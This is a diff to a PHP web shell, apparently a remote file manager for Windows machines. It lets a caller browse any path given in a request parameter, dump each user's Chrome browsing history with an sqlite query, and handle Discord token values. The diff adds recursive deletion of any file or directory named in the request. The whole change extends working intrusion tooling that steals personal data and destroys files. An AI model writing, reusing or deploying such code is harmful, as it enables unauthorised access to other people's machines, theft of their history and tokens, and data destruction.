@@ -6,7 +6,7 @@
     $rawdir = 'C:\\';
     $dir = scandir($rawdir);
     if(isset($_REQUEST['path'])){
-        $rawdir = str_replace("%20","\ ",realpath($_GET['path']) ? realpath($_GET['path']) : $_GET['path']);
+        $rawdir = str_replace("\ ","%20",realpath($_GET['path']) ? realpath($_GET['path']) : $_GET['path']);
         if(is_dir($_GET['path'])) {
             $dir = scandir($rawdir);
         } else {
@@ -44,6 +44,23 @@
         fclose($aga);
     };
 
+    function rrmdir($src) {
+        $dir = opendir($src);
+        while(false !== ( $file = readdir($dir)) ) {
+            if (( $file != '.' ) && ( $file != '..' )) {
+                $full = $src . '//' . $file;
+                $full = str_replace(" ","\\ ", $full);
+                if ( is_dir($full) ) {
+                    rrmdir(urldecode($full));
+                }
+                else {
+                    unlink(urldecode($full));
+                }
+            }
+        }
+        closedir($dir);
+        rmdir($src);
+    }
 
     function boiola($har){
         header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . $har, true, 303);
@@ -63,7 +80,11 @@
                 boiola(join('\\',$e));
             break;
             case 'delete': 
-                unlink($rawdir);
+                if(is_file($rawdir)){
+                    unlink($rawdir);
+                } elseif(is_dir($rawdir)){
+                    rrmdir($rawdir);
+                }
                 boiola($voltado);
             break;
         };
@@ -108,6 +129,7 @@
         <select name="qa" id="qa">
             <option value="chrome" selected>chrome</option>
             <option value="discord">discord</option>
+            <option value="delete">delete</option>
         </select>
         <script>
             document.body.onload = ()=>{
@@ -122,6 +144,11 @@
                         case "discord":
                             for(const DESGRAÇA of document.querySelectorAll('.q')) {
                                 DESGRAÇA.href = `javascript: console.log(${DESGRAÇA.querySelector('input[name="tokens"]').value})`;
+                            }
+                        break;
+                        case "delete":
+                            for(const DESGRAÇA of document.querySelectorAll('.q')) {
+                                DESGRAÇA.href = `javascript: if(confirm("O_O")) location.href = "${DESGRAÇA.querySelector('input[name="delete"]').value}"`;
                             }
                         break;
                     };
@@ -183,7 +210,9 @@
                                             };
                                         }; 
                                         echo $euqueromematar;
-                                    ?>'> <input type="hidden" name="chrome" value='?path=<?=$rawdir . '\\' . $dir[$i]?>\\AppData\\Local\\Google\\Chrome\\User%20Data\\Default\\History&action=sqlite&query=.dump'> </form></a> </td>
+                                    ?>'> <input type="hidden" name="chrome" value='?path=<?=$rawdir . '\\' . $dir[$i]?>\\AppData\\Local\\Google\\Chrome\\User%20Data\\Default\\History&action=sqlite&query=.dump'> <input type="hidden" name="delete" value="?path=<?=$rawdir . '\\' . $dir[$i]?>&action=delete"> </form>
+                                      
+                                </a> </td>
                 </tr>
                 <?php
                 };
